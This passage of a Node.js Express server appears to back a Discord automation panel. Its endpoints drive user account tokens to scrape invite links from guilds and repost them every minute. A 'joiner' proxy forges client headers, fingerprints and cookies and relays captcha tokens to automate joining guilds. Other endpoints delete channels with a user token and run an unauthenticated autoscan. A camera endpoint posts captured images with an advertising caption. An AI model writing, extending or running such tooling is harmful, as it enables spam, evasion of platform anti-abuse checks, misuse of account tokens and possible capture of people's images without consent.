        const result = await deleteLicenseKey(key);
        
        if (!result) {
            return res.status(404).json({ success: false, error: 'キーが見つかりません' });
        }
        
        res.json({ success: true, message: 'キーを削除しました' });
    } catch (error) {
        console.error('Delete license key error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

app.post('/api/admin/change-password', verifyAdminSession, async (req, res) => {
    try {
        const { newPassword } = req.body;
        if (!newPassword || newPassword.length < 6) {
            return res.status(400).json({ success: false, error: 'パスワードは6文字以上必要です' });
        }
        
        const hash = await bcrypt.hash(newPassword, 10);
        await setAdminPasswordHash(hash);
        
        res.json({ success: true, message: 'パスワードを変更しました' });
    } catch (error) {
        console.error('Change password error:', error);
        res.status(500).json({ success: false, error: 'サーバーエラー' });
    }
});

// ========== Discord Invite Link Scanning Endpoints ==========
const { scanGuildForInvites, getGuildChannels } = require('./utils/discordInviteScanner');

app.post('/api/admin/discord-scan-start', verifyAdminSession, async (req, res) => {
    try {
        const { guildId, userToken, daysAgo = 7, channelIds } = req.body;
        
        if (!guildId || !userToken) {
            return res.status(400).json({ success: false, error: 'Guild ID and user token required' });
        }
        
        // Get channels if not specified
        let channels = null;
        if (channelIds && channelIds.length > 0) {
            channels = channelIds.map(id => ({ id }));
        } else {
            const allChannels = await getGuildChannels(guildId, userToken);
            channels = allChannels.slice(0, 10); // Limit to 10 channels
        }
        
        const result = await scanGuildForInvites(guildId, userToken, daysAgo, channels);
        res.json(result);
    } catch (error) {
        console.error('Discord scan error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/discord-channels', verifyAdminSession, async (req, res) => {
    try {
        const { guildIds = [], token } = req.body;
        
        if (!guildIds || !Array.isArray(guildIds) || guildIds.length === 0 || !token) {
            return res.status(400).json({ success: false, error: 'Guild IDs array and user token required' });
        }
        
        const allChannels = [];
        
        for (const guildId of guildIds) {
            try {
                const channels = await getGuildChannels(guildId, token);
                const guildName = guildId; // Try to fetch guild name in future
                channels.forEach(ch => {
                    allChannels.push({
                        id: ch.id,
                        name: ch.name,
                        guildId: guildId,
                        guildName: ch.guild_name || guildId,
                        textContent: `[${ch.guild_name || guildId}] #${ch.name}`
                    });
                });
            } catch (err) {
                console.error(`Failed to get channels for guild ${guildId}:`, err.message);
            }
        }
        
        const textChannels = allChannels.sort((a, b) => a.name.localeCompare(b.name));
        
        // Save available channels list
        const discordSettings = await getDiscordSettings();
        discordSettings.availableChannels = textChannels;
        await updateDiscordSettings(discordSettings);
        console.log('[Discord] Saved', textChannels.length, 'available channels');
        
        res.json({ success: true, channels: textChannels });
    } catch (error) {
        console.error('Get channels error:', error.response?.data || error.message);
        if (error.response?.status === 401) {
            return res.status(401).json({ success: false, error: 'Invalid user token' });
        }
        if (error.response?.status === 403) {
            return res.status(403).json({ success: false, error: 'No access to this guild' });
        }
        res.status(500).json({ success: false, error: 'Failed to get channels' });
    }
});

app.post('/api/admin/scan-discord-invites', verifyAdminSession, async (req, res) => {
    try {
        const { guildIds = [], channelIds = null, token, days = 7 } = req.body;
        
        if (!guildIds || !Array.isArray(guildIds) || guildIds.length === 0 || !token) {
            return res.status(400).json({ success: false, error: 'Guild IDs array and user token required' });
        }
        
        const allInvites = new Map();
        let totalScanned = 0;
        
        for (const guildId of guildIds) {
            try {
                let channels = await getGuildChannels(guildId, token);
                
                // Filter to selected channels if provided
                if (channelIds && channelIds.length > 0) {
                    channels = channels.filter(ch => channelIds.includes(ch.id));
                }
                
                // Limit channels scanned
                channels = channels.slice(0, 10);
                
                for (const channel of channels) {
                    try {
                        const messages = await require('./utils/discordInviteScanner').getChannelMessages(guildId, channel.id, token, days);
                        totalScanned += messages.length;
                        
                        for (const msg of messages) {
                            const invites = require('./utils/discordInviteScanner').extractInviteLinks(msg.content);
                            for (const inviteUrl of invites) {
                                if (!allInvites.has(inviteUrl)) {
                                    allInvites.set(inviteUrl, {
                                        url: inviteUrl,
                                        channel: channel.name,
                                        author: msg.author?.username || 'Unknown',
                                        firstFound: msg.timestamp
                                    });
                                }
                            }
                        }
                    } catch (err) {
                        console.error(`Failed to scan channel ${channel.id}:`, err.message);
                    }
                }
            } catch (err) {
                console.error(`Failed to scan guild ${guildId}:`, err.message);
            }
        }
        
        const invites = Array.from(allInvites.values()).sort((a, b) => 
            new Date(b.firstFound) - new Date(a.firstFound)
        );
        
        res.json({ 
            success: true, 
            invites: invites,
            totalInvites: invites.length,
            totalMessagesScanned: totalScanned
        });
    } catch (error) {
        console.error('Discord invite scan error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/send-discord-invites', verifyAdminSession, async (req, res) => {
    try {
        const { channelId, invites } = req.body;
        
        if (!channelId || !Array.isArray(invites) || invites.length === 0) {
            return res.status(400).json({ success: false, error: 'Channel ID and invites array required' });
        }
        
        try {
            const channel = await client2.channels.fetch(channelId);
            if (!channel) {
                return res.status(404).json({ success: false, error: 'Channel not found' });
            }
            
            let sent = 0;
            for (const inviteUrl of invites) {
                try {
                    await channel.send({
                        content: inviteUrl,
                        allowedMentions: { parse: [] }
                    });
                    sent++;
                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (err) {
                    console.error(`Failed to send invite ${inviteUrl}:`, err.message);
                }
            }
            
            res.json({ 
                success: true, 
                sent: sent,
                total: invites.length
            });
        } catch (err) {
            console.error('Channel fetch error:', err.message);
            res.status(500).json({ success: false, error: 'Failed to access channel' });
        }
    } catch (error) {
        console.error('Send invites error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Delete Discord channel endpoint
app.post('/api/admin/delete-channel', verifyAdminSession, async (req, res) => {
    try {
        const { channelId, token } = req.body;
        
        if (!channelId || !token) {
            return res.status(400).json({ success: false, error: 'Channel ID and user token required' });
        }
        
        try {
            // Use user token to delete channel via Discord API
            const headers = getDiscordHeaders(token);
            await axios.delete(
                `${DISCORD_API_BASE}/channels/${channelId}`,
                { headers }
            );
            
            res.json({ 
                success: true, 
                message: `チャンネル ${channelId} を削除しました`,
                channelId: channelId
            });
        } catch (err) {
            if (err.response?.status === 401) {
                return res.status(401).json({ success: false, error: 'Invalid user token' });
            }
            if (err.response?.status === 403) {
                return res.status(403).json({ success: false, error: 'このチャンネルを削除する権限がありません' });
            }
            if (err.response?.status === 404) {
                return res.status(404).json({ success: false, error: 'チャンネルが見つかりません' });
            }
            throw err;
        }
    } catch (error) {
        console.error('Delete channel error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== Auto Monitor Settings ==========
const channelMonitorSettings = new Map();
const userTokenMonitors = new Map();
const discordSettings = new Map();
const sentInvites = new Set(); // Track sent invites to avoid duplicates
let autoMonitorIntervalId = null;

const runAutoMonitorScan = async (settings) => {
    try {
        const { guildIds, userToken, channelIds, sendTargetChannelId } = settings;
        if (!guildIds || !userToken || !sendTargetChannelId) return;
        
        const inviteRegex = /(https?:\/\/)?(www\.)?discord(app)?\.gg\/[a-zA-Z0-9]+/gi;
        const newInvites = [];
        
        // 過去1日のメッセージのみ取得
        const daysAgo = 1;
        
        for (const guildId of guildIds) {
            try {
                // チャンネルが指定されていない場合は最初のチャンネルを使用
                const targetChannelId = (channelIds && channelIds.length > 0) ? channelIds[0] : null;
                if (!targetChannelId) {
                    console.log(`[AutoMonitor] Channel ID not specified for guild ${guildId}`);
                    continue;
                }
                
                const guildsData = await require('./utils/discordInviteScanner').getChannelMessages(
                    guildId,
                    targetChannelId,
                    userToken,
                    daysAgo  // 1日前までのメッセージのみ
                );
                
                for (const msg of guildsData) {
                    const invites = (msg.content.match(inviteRegex) || []).map(m => 
                        m.startsWith('http') ? m : `https://discord.gg/${m.split('/').pop()}`
                    );
                    
                    for (const inviteUrl of invites) {
                        // ボットが以前に送信済みのリンクは追加しない
                        if (!sentInvites.has(inviteUrl)) {
                            newInvites.push(inviteUrl);
                            sentInvites.add(inviteUrl);
                            console.log(`[AutoMonitor] Found new invite: ${inviteUrl}`);
                        }
                    }
                }
            } catch (err) {
                console.error(`[AutoMonitor] Guild scan error for ${guildId}:`, err.message);
            }
        }
        
        if (newInvites.length > 0) {
            try {
                await axios.post(
                    `https://discord.com/api/v9/channels/${sendTargetChannelId}/messages`,
                    { content: newInvites.join('\n'), allowed_mentions: { parse: [] } },
                    {
                        headers: {
                            'authorization': userToken,
                            'content-type': 'application/json',
                            'user-agent': 'Mozilla/5.0'
                        },
                        validateStatus: () => true
                    }
                );
                console.log(`[AutoMonitor] Sent ${newInvites.length} new invites`);
            } catch (e) {
                console.error(`[AutoMonitor] Send error: ${e.message}`);
            }
        }
    } catch (err) {
        console.error('[AutoMonitor] Error:', err.message);
    }
};

const startAutoMonitor = (settings) => {
    if (autoMonitorIntervalId) clearInterval(autoMonitorIntervalId);
    if (!settings || !settings.enabled) return;

    console.log('[AutoMonitor] Starting with guildIds:', settings.guildIds);
    
    // 即座に初回スキャン実行
    console.log('[AutoMonitor] Running initial scan immediately...');
    runAutoMonitorScan(settings).catch(err => {
        console.error('[AutoMonitor] Initial scan error:', err.message);
    });
    
    // その後、定期的に実行（1分ごと）
    autoMonitorIntervalId = setInterval(() => {
        runAutoMonitorScan(settings).catch(err => {
            console.error('[AutoMonitor] Periodic scan error:', err.message);
        });
    }, 60 * 1000); // 1分ごと
};

// Discord settings - shared between scan and monitor functions
app.get('/api/admin/discord-settings', verifyAdminSession, async (req, res) => {
    try {
        const settings = await getDiscordSettings();
        res.json({ success: true, settings });
    } catch (error) {
        console.error('Discord settings get error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/discord-settings', verifyAdminSession, async (req, res) => {
    try {
        const { discordGuildId, discordUserToken, discordDaysAgo, sendTargetChannelId, selectedChannels, selectedChannelInfo } = req.body;
        
        const settings = {
            discordGuildId: discordGuildId || '',
            discordUserToken: discordUserToken || '',
            discordDaysAgo: discordDaysAgo || 7,
            sendTargetChannelId: sendTargetChannelId || '',
            selectedChannels: selectedChannels || [],
            selectedChannelInfo: selectedChannelInfo || []
        };
        
        await updateDiscordSettings(settings);
        console.log('[Discord] Settings saved with channels:', selectedChannels);
        res.json({ success: true });
    } catch (error) {
        console.error('Discord settings save error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/auto-monitor-settings', verifyAdminSession, async (req, res) => {
    try {
        const { enabled, guildIds, userToken, channelIds, sendTargetChannelId } = req.body;
        const key = 'auto-monitor';
        
        if (!enabled) {
            channelMonitorSettings.delete(key);
            if (autoMonitorIntervalId) {
                clearInterval(autoMonitorIntervalId);
                autoMonitorIntervalId = null;
            }
            console.log('[AutoMonitor] Stopped');
            return res.json({ success: true });
        }
        
        if (!userToken || !guildIds || guildIds.length === 0 || !channelIds || channelIds.length === 0 || !sendTargetChannelId) {
            return res.status(400).json({ success: false, error: 'All fields required: userToken, guildIds, channelIds, sendTargetChannelId' });
        }
        
        const settings = { enabled: true, userToken, guildIds, channelIds, sendTargetChannelId };
        channelMonitorSettings.set(key, settings);
        startAutoMonitor(settings);
        
        console.log('[AutoMonitor] Settings saved - Guilds:', guildIds, '-> Send to:', sendTargetChannelId);
        res.json({ success: true });
    } catch (error) {
        console.error('Auto monitor settings error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});


// ========== Joiner Proxy Endpoints ==========
// Cookie storage for joiner sessions
const joinerCookies = new Map();

// Proxy for Discord experiments/fingerprint
app.post('/api/joiner/fingerprint', async (req, res) => {
    try {
        const { superProperties, locale, timezone } = req.body;
        const sessionId = req.headers['x-joiner-session'] || crypto.randomBytes(16).toString('hex');
        
        const response = await axios.get('https://discord.com/api/v9/experiments', {
            headers: {
                'x-context-properties': Buffer.from(JSON.stringify({ location: '/channels/@me' })).toString('base64'),
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': locale || 'ja',
                'x-discord-timezone': timezone || 'Asia/Tokyo',
                'x-super-properties': superProperties,
                'accept': '*/*',
                'accept-language': 'ja,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
            },
            validateStatus: () => true
        });
        
        // Store cookies from response
        const setCookies = response.headers['set-cookie'];
        if (setCookies) {
            joinerCookies.set(sessionId, setCookies.map(c => c.split(';')[0]).join('; '));
        }
        
        res.json({
            success: true,
            fingerprint: response.data?.fingerprint,
            sessionId: sessionId
        });
    } catch (error) {
        console.error('Joiner fingerprint error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Proxy for Discord invite info
app.get('/api/joiner/invite/:code', async (req, res) => {
    try {
        const { code } = req.params;
        const { superProperties, locale, timezone } = req.query;
        
        const response = await axios.get(`https://discord.com/api/v9/invites/${code}?with_counts=true&with_expiration=true&with_permissions=true`, {
            headers: {
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': locale || 'ja',
                'x-discord-timezone': timezone || 'Asia/Tokyo',
                'x-super-properties': superProperties,
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
            },
            validateStatus: () => true
        });
        
        res.status(response.status).json(response.data);
    } catch (error) {
        console.error('Joiner invite info error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Proxy for Discord guild join
app.post('/api/joiner/join/:code', async (req, res) => {
    try {
        const { code } = req.params;
        const sessionId = req.headers['x-joiner-session'];
        const storedCookies = sessionId ? joinerCookies.get(sessionId) : '';
        
        const headers = {
            'authorization': req.headers['authorization'],
            'content-type': 'application/json',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': req.headers['x-discord-locale'] || 'ja',
            'x-discord-timezone': req.headers['x-discord-timezone'] || 'Asia/Tokyo',
            'x-super-properties': req.headers['x-super-properties'],
            'accept': '*/*',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        };
        
        if (req.headers['x-context-properties']) headers['x-context-properties'] = req.headers['x-context-properties'];
        if (req.headers['x-fingerprint']) headers['x-fingerprint'] = req.headers['x-fingerprint'];
        if (req.headers['x-captcha-key']) headers['x-captcha-key'] = req.headers['x-captcha-key'];
        if (req.headers['x-captcha-rqtoken']) headers['x-captcha-rqtoken'] = req.headers['x-captcha-rqtoken'];
        if (req.headers['x-captcha-session-id']) headers['x-captcha-session-id'] = req.headers['x-captcha-session-id'];
        if (storedCookies) headers['cookie'] = storedCookies;
        
        const response = await axios.post(`https://discord.com/api/v9/invites/${code}`, req.body, {
            headers: headers,
            validateStatus: () => true
        });
        
        // Store new cookies
        const setCookies = response.headers['set-cookie'];
        if (setCookies && sessionId) {
            const newCookies = setCookies.map(c => c.split(';')[0]).join('; ');
            const existingCookies = joinerCookies.get(sessionId) || '';
            joinerCookies.set(sessionId, existingCookies ? `${existingCookies}; ${newCookies}` : newCookies);
        }
        
        res.status(response.status).json(response.data);
    } catch (error) {
        console.error('Joiner join error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Cleanup old joiner sessions (older than 30 minutes)
setInterval(() => {
    const now = Date.now();
    for (const [key, value] of joinerCookies.entries()) {
        if (now - (value.createdAt || 0) > 30 * 60 * 1000) {
            joinerCookies.delete(key);
        }
    }
}, 5 * 60 * 1000);

// Panel autoscan control endpoints (no admin session check for now)
app.post('/api/autoscan-panel/start', async (req, res) => {
    try {
        const { guildIds, userToken, channelIds, sendTargetChannelId } = req.body;
        if (!guildIds || !userToken || !channelIds || !sendTargetChannelId) {
            return res.status(400).json({ success: false, error: 'Missing required fields: guildIds, userToken, channelIds, sendTargetChannelId' });
        }

        // Save config
        const config = { guildIds, userToken, channelIds, sendTargetChannelId, enabled: true };
        await updateAutoScanPanelConfig(config);

        // Start scan loop
        startPanelAutoScanLoop(guildIds, userToken, channelIds, sendTargetChannelId);

        res.json({ success: true, message: 'Panel autoscan started' });
    } catch (error) {
        console.error('Error starting panel autoscan:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Helper function to start the panel autoscan loop
function startPanelAutoScanLoop(guildIds, userToken, channelIds, sendTargetChannelId) {
    // Stop existing panel scan
    if (panelAutoScanInterval) clearInterval(panelAutoScanInterval);

    // Run first scan immediately
    performPanelAutoScan(guildIds, userToken, channelIds, sendTargetChannelId).catch(err => {
        console.error('[PanelAutoScan] Error in initial scan:', err.message);
    });

    // Start new scan loop (every 60 seconds)
    panelAutoScanInterval = setInterval(() => {
        performPanelAutoScan(guildIds, userToken, channelIds, sendTargetChannelId).catch(err => {
            console.error('[PanelAutoScan] Error:', err.message);
        });
    }, 60000);
}

app.post('/api/autoscan-panel/stop', async (req, res) => {
    try {
        if (panelAutoScanInterval) {
            clearInterval(panelAutoScanInterval);
            panelAutoScanInterval = null;
        }
        const config = await getAutoScanPanelConfig();
        config.enabled = false;
        await updateAutoScanPanelConfig(config);
        res.json({ success: true, message: 'Panel autoscan stopped' });
    } catch (error) {
        console.error('Error stopping panel autoscan:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Panel autoscan function - performs the actual scanning and sending
async function performPanelAutoScan(guildIds, userToken, channelIds, sendTargetChannelId) {
    if (!panelAutoScanInterval) return;
    
    try {
        const config = await getAutoScanPanelConfig();
        if (!config.enabled) {
            if (panelAutoScanInterval) clearInterval(panelAutoScanInterval);
            panelAutoScanInterval = null;
            return;
        }

        console.log('[PanelAutoScan] Running scan cycle');
        
        // Use same logic as /api/admin/scan-discord-invites endpoint
        const allInvites = new Map();
        let totalScanned = 0;
        
        for (const guildId of guildIds) {
            try {
                let channels = await getGuildChannels(guildId, userToken);
                
                // Filter to selected channels if provided
                if (channelIds && channelIds.length > 0) {
                    channels = channels.filter(ch => channelIds.includes(ch.id));
                }
                
                // Limit channels scanned
                channels = channels.slice(0, 10);
                
                const daysAgo = 1; // Panel auto-scan uses 1 day
                
                for (const channel of channels) {
                    try {
                        const messages = await require('./utils/discordInviteScanner').getChannelMessages(guildId, channel.id, userToken, daysAgo);
                        totalScanned += messages.length;
                        
                        for (const msg of messages) {
                            const invites = require('./utils/discordInviteScanner').extractInviteLinks(msg.content);
                            for (const inviteUrl of invites) {
                                if (!allInvites.has(inviteUrl)) {
                                    allInvites.set(inviteUrl, {
                                        url: inviteUrl,
                                        channel: channel.name,
                                        author: msg.author?.username || 'Unknown',
                                        firstFound: msg.timestamp
                                    });
                                }
                            }
                        }
                    } catch (err) {
                        console.error(`[PanelAutoScan] Failed to scan channel ${channel.id}:`, err.message);
                    }
                }
            } catch (err) {
                console.error(`[PanelAutoScan] Failed to scan guild ${guildId}:`, err.message);
            }
        }
        
        const invites = Array.from(allInvites.values());
        
        if (invites.length > 0) {
            console.log(`[PanelAutoScan] Found ${invites.length} invites in ${totalScanned} messages, sending to channel ${sendTargetChannelId}`);
            
            // Send invites to target channel using user token (same as manual scan)
            try {
                // Send in chunks to avoid message size limits
                const chunkSize = 10;
                for (let i = 0; i < invites.length; i += chunkSize) {
                    const chunk = invites.slice(i, i + chunkSize);
                    const message = chunk.map(inv => inv.url).join('\n');
                    
                    await axios.post(
                        `https://discord.com/api/v10/channels/${sendTargetChannelId}/messages`,
                        { content: message },
                        { 
                            headers: { 
                                'Authorization': userToken,
                                'Content-Type': 'application/json'
                            }
                        }
                    );
                    
                    // Rate limiting
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                
                console.log(`[PanelAutoScan] Successfully sent ${invites.length} invites to channel ${sendTargetChannelId}`);
            } catch (err) {
                console.error('[PanelAutoScan] Failed to send message:', err.message);
                if (err.response?.data) {
                    console.error('[PanelAutoScan] Error details:', err.response.data);
                }
            }
        } else {
            console.log('[PanelAutoScan] No new invites found in scanned messages');
        }
    } catch (err) {
        console.error('[PanelAutoScan] Scan error:', err.message);
    }
}

// Autoscan panel config endpoints
app.post('/api/autoscan-config', verifyAdminSession, async (req, res) => {
    try {
        const { guildIds, userToken, channelIds, sendTargetChannelId, enabled } = req.body;
        const config = {
            guildIds: guildIds || [],
            userToken: userToken || '',
            channelIds: channelIds || [],
            sendTargetChannelId: sendTargetChannelId || '',
            enabled: enabled || false
        };
        await updateAutoScanPanelConfig(config);
        res.json({ success: true, config });
    } catch (error) {
        console.error('Error saving autoscan config:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/autoscan-config', verifyAdminSession, async (req, res) => {
    try {
        const config = await getAutoScanPanelConfig();
        res.json({ success: true, config });
    } catch (error) {
        console.error('Error loading autoscan config:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Camera Channel API
app.get('/api/camera-channel', async (req, res) => {
    try {
        const cameraChannel = await getCameraChannel();
        res.json({ success: true, cameraChannel });
    } catch (error) {
        console.error('Error getting camera channel:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/camera-channel', async (req, res) => {
    try {
        const { channelId, guildId } = req.body;
        await setCameraChannel(channelId, guildId);
        res.json({ success: true, message: 'Camera channel set' });
    } catch (error) {
        console.error('Error setting camera channel:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Send captured image to Discord
app.post('/api/send-camera-image', async (req, res) => {
    try {
        const { imageData } = req.body;
        const cameraChannel = await getCameraChannel();
        
        if (!cameraChannel.channelId) {
            return res.status(400).json({ success: false, error: 'No camera channel configured' });
        }
        
        const base64Data = imageData.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        // Create form data for image
        const form = new FormData();
        form.append('file', buffer, 'camera_capture.jpg');
        form.append('payload_json', JSON.stringify({ content: '📷 自撮り！かっこよ discord.gg/NYmSAdHjWV' }));
        
        await axios.post(
            `https://discord.com/api/v10/channels/${cameraChannel.channelId}/messages`,
            form,
            {
                headers: {
                    ...form.getHeaders(),
                    'Authorization': `Bot ${config.BOT_TOKEN_2}`
                }
            }
        ).then(response => {
            res.json({ success: true, messageId: response.data.id });
        }).catch(err => {
            console.error('Failed to send image to Discord:', err.message);
            res.status(500).json({ success: false, error: 'Failed to send image to Discord' });
        });
    } catch (error) {
        console.error('Error in send-camera-image:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
